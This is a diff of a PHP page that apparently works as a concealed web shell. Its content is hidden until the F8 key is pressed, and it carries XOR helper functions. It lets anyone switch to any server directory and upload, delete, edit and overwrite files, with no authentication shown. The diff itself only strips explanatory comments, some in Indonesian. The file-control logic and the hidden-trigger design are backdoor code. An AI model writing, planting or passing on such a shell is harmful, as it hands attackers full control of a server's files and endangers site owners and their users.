@@ -76,7 +76,6 @@
     <script>
         function checkF8(event) {
             if (event.key === "F8") {
-                // If F8 is pressed, change background and title
                 document.body.style.backgroundColor = "#932C77";
                 document.title = "BACKNADYA";
                 sessionStorage.setItem('f8Pressed', 'true');
@@ -92,7 +91,7 @@
                 document.querySelector('.bernadya-content').style.display = 'block';
                 document.querySelector('.f8-message').style.display = 'none';
             } else {
-                document.body.style.backgroundColor = 'white';  // White background before F8
+                document.body.style.backgroundColor = 'white';
                 document.addEventListener('keydown', checkF8);
             }
         });
@@ -111,11 +110,10 @@
         }
 
         function xor_decrypt($data, $key) {
-            return xor_encrypt($data, $key);  // XOR decryption is same as encryption
+            return xor_encrypt($data, $key);
         }
 
         function get_file_permissions($file) {
-            // Mengecek apakah file ada sebelum mencoba mendapatkan permissions
             if (file_exists($file)) {
                 return substr(sprintf('%o', fileperms($file)), -4);
             } else {
@@ -127,23 +125,16 @@
             return is_writable($file);
         }
 
-        // Start session
         session_start();
         if (!isset($_SESSION['dir'])) {
-            $_SESSION['dir'] = '.';  // Default directory is root
+            $_SESSION['dir'] = '.';
         }
-
-        // Update directory if 'dir' is received from form
         if (isset($_POST['dir']) && is_dir($_POST['dir'])) {
-            $_SESSION['dir'] = $_POST['dir'];  // Update directory if valid
+            $_SESSION['dir'] = $_POST['dir'];
         }
-
-        // Get the directory stored in session
         $dir = $_SESSION['dir'];
         $files = scandir($dir);
         $current_dir = realpath($dir);
-
-        // Handle file upload
         if (isset($_FILES['uploaded_file'])) {
             $file_name = $_FILES['uploaded_file']['name'];
             $file_tmp = $_FILES['uploaded_file']['tmp_name'];
@@ -155,8 +146,6 @@
                 $upload_message = 'Failed to upload the file.';
             }
         }
-
-        // Handle file delete
         if (isset($_POST['delete_file'])) {
             $file_path = $_POST['delete_file'];
             if (file_exists($file_path)) {
@@ -169,8 +158,6 @@
                 $delete_message = 'File does not exist.';
             }
         }
-
-        // Handle file edit
         if (isset($_POST['edit_file'])) {
             $file_path = $_POST['edit_file'];
             $file_contents = file_get_contents($file_path);
@@ -185,8 +172,6 @@
                 }
             }
         }
-
-        // Handle file save
         if (isset($_POST['save_file'])) {
             $file_path = $_POST['save_file'];
             $new_contents = $_POST['edited_contents'];
